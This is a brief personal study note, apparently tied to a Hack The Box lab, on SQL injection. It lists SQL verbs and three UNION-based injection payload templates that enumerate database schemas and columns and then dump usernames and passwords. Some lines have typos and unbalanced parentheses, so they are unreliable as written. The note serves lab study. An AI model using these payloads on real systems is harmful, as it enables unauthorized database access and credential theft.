SQL Injection is an attack in which malicious SQL statements are injected into SQL
easy to avoid

# Common SQL Verbs
SQL statment begin with verbs
SELECT
INSERT
DELETE
UPDATE
DROP
UNION

# Additional to [[SQL-Injection (SQLi)]]
from [[00 Progress/Boxes/HTB/Linux/Shared/01 Exploit]]

change # to the values


1- union select 1,(select group_concat(schema_name) from INFORMATION_SCHEMA.SCHEMATA,3-- -

2- union select 1,(select group_concat(TABBLE_NAME,':',COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA like '# DATABASE NAME '),3-- -

3- union select 1,(select group_concat(# username ,':',# password) from # user  ,3-- -



